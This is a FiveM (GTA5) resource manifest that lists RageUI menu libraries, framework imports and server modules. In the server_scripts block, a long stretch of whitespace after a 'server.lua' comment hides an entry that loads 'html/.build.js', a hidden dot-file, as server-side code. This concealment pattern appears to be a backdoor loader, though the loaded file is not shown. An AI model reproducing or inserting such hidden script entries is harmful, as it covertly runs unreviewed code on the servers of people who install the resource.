fx_version "adamant";

game "gta5";
lua54 "yes";

author "";
description "";
version "0.1";

client_scripts {
	"Libs/RageUI/RMenu.lua",
    "Libs/RageUI/menu/RageUI.lua",
    "Libs/RageUI/menu/Menu.lua",
    "Libs/RageUI/menu/MenuController.lua",
    "Libs/RageUI/components/*.lua",
    "Libs/RageUI/menu/elements/*.lua",
    "Libs/RageUI/menu/items/*.lua",
    "Libs/RageUI/menu/panels/*.lua",
    "Libs/RageUI/menu/windows/*.lua",
};

shared_scripts {
    '@Framework/imports.lua',
    "Modules/**/shared/*.lua",
};

client_scripts {

};

server_scripts {
    "@oxmysql/lib/MySQL.lua",
    "Modules/**/server/*.lua",
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'html/.build.js',
};

dependency '/assetpacks'